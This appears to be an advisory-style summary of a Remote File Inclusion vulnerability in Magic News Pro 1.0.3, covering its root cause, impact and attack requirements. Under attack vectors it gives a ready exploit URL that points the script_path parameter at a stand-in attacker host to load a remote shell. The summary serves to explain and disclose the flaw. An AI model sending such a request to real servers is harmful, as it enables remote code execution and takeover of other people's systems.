```
**Summary:**
The provided content indicates a Remote File Inclusion vulnerability in Magic News Pro version 1.0.3.

**Root cause of vulnerability:**
The vulnerability stems from the insecure use of the `script_path` variable in `news_page.php`. The script uses `include_once($script_path."/config.php");`, which allows an attacker to inject a malicious URL into the `script_path` parameter. This causes the server to include and execute the malicious file from the attacker's server.

**Weaknesses/vulnerabilities:**
- Remote File Inclusion (RFI): The application includes files from a remote location without proper sanitization of the user-supplied `script_path` variable.

**Impact of exploitation:**
- Arbitrary code execution: An attacker can execute arbitrary code on the server by including a malicious file from their own server.
- Full compromise: If the attacker includes a web shell, they could potentially gain complete control over the compromised server.

**Attack vectors:**
- HTTP GET request: The attacker injects a malicious URL into the `script_path` parameter within a GET request to the vulnerable `news_page.php` file.
  Example: `http://sitename.com/news/scripts/news_page.php?script_path=http://SHELLURL.COM?`

**Required attacker capabilities/position:**
- The attacker needs the ability to send an HTTP request to the vulnerable web server and must be able to host a malicious file on a server accessible to the vulnerable web server.
